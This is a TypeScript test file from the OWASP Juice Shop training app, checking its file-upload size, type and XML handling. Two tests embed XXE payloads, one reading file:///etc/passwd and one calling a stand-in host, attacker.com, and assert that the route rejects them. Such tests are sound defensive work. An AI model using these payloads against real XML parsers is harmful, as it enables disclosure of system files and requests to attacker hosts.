/*
 * Copyright (c) 2014-2026 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import { describe, it, beforeEach } from 'node:test'
import assert from 'node:assert/strict'
import { challenges } from '../../data/datacache'
import { type Challenge } from '@juice-shop/data/types'
import { checkUploadSize, checkFileType, handleXmlUpload } from '../../routes/fileUpload'

void describe('fileUpload', () => {
  let req: any
  let res: any
  let save: any

  beforeEach(() => {
    req = { file: { originalname: '' } }
    res = {}
    save = () => ({
      then () { }
    })
  })

  void describe('should not solve "uploadSizeChallenge" when file size is', () => {
    const sizes = [0, 1, 100, 1000, 10000, 99999, 100000]
    sizes.forEach(size => {
      void it(`${size} bytes`, () => {
        challenges.uploadSizeChallenge = { solved: false, save } as unknown as Challenge
        req.file.size = size

        checkUploadSize(req, res, () => {})

        assert.equal(challenges.uploadSizeChallenge.solved, false)
      })
    })
  })

  void it('should solve "uploadSizeChallenge" when file size exceeds 100000 bytes', () => {
    challenges.uploadSizeChallenge = { solved: false, save } as unknown as Challenge
    req.file.size = 100001

    checkUploadSize(req, res, () => {})

    assert.equal(challenges.uploadSizeChallenge.solved, true)
  })

  void it('should solve "uploadTypeChallenge" when file type is not PDF', () => {
    challenges.uploadTypeChallenge = { solved: false, save } as unknown as Challenge
    req.file.originalname = 'hack.exe'

    checkFileType(req, res, () => {})

    assert.equal(challenges.uploadTypeChallenge.solved, true)
  })

  void it('should not solve "uploadTypeChallenge" when file type is PDF', () => {
    challenges.uploadTypeChallenge = { solved: false, save } as unknown as Challenge
    req.file.originalname = 'hack.pdf'

    checkFileType(req, res, () => {})

    assert.equal(challenges.uploadTypeChallenge.solved, false)
  })

  void describe('handleXmlUpload', () => {
    it('should reject XML with external entities (SYSTEM)', async () => {
      challenges.deprecatedInterfaceChallenge = { solved: false, save } as unknown as Challenge
      req.file.originalname = 'malicious.xml'
      req.file.buffer = Buffer.from(`<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`)
      let statusCalledWith = 0
      res.status = (code: number) => {
        statusCalledWith = code
        return res
      }

      let errorPassed: Error | undefined
      await handleXmlUpload(req, res, (err?: any) => {
        errorPassed = err
      })

      assert.equal(statusCalledWith, 410)
      assert.ok(errorPassed instanceof Error)
      assert.match(errorPassed.message, /forbidden external entity/i)
    })

    it('should reject XML with external entities (PUBLIC)', async () => {
      challenges.deprecatedInterfaceChallenge = { solved: false, save } as unknown as Challenge
      req.file.originalname = 'malicious_public.xml'
      req.file.buffer = Buffer.from(`<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe PUBLIC "public_id" "http://attacker.com/evt"> ]>
<foo>&xxe;</foo>`)
      let statusCalledWith = 0
      res.status = (code: number) => {
        statusCalledWith = code
        return res
      }

      let errorPassed: Error | undefined
      await handleXmlUpload(req, res, (err?: any) => {
        errorPassed = err
      })

      assert.equal(statusCalledWith, 410)
      assert.ok(errorPassed instanceof Error)
      assert.match(errorPassed.message, /forbidden external entity/i)
    })

    it('should allow normal XML through to the XML parser', async () => {
      challenges.deprecatedInterfaceChallenge = { solved: false, save } as unknown as Challenge
      challenges.xxeFileDisclosureChallenge = { solved: false, save } as unknown as Challenge
      req.file.originalname = 'normal.xml'
      req.file.buffer = Buffer.from(`<?xml version="1.0"?>
<foo>bar</foo>`)
      let statusCalledWith = 0
      res.status = (code: number) => {
        statusCalledWith = code
        return res
      }

      let errorPassed: Error | undefined
      await handleXmlUpload(req, res, (err?: any) => {
        errorPassed = err
      })

      assert.equal(statusCalledWith, 410)
      assert.ok(errorPassed instanceof Error)
      assert.match(errorPassed.message, /deprecated for security reasons/i)
      assert.ok(!errorPassed.message.includes('forbidden external entity'))
    })
  })
})
